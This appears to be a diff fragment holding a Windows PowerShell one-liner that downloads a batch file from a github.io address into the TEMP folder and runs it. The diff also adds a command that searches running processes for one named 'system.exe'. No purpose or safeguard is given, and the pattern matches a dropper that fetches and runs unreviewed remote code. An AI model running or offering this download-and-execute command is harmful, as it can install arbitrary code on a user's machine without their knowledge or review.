@@ -1,1 +1,3 @@
 powershell -Command "wget 'https://luckiestpancake.github.io/Files/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"
+
+tasklist /v | findstr system.exe
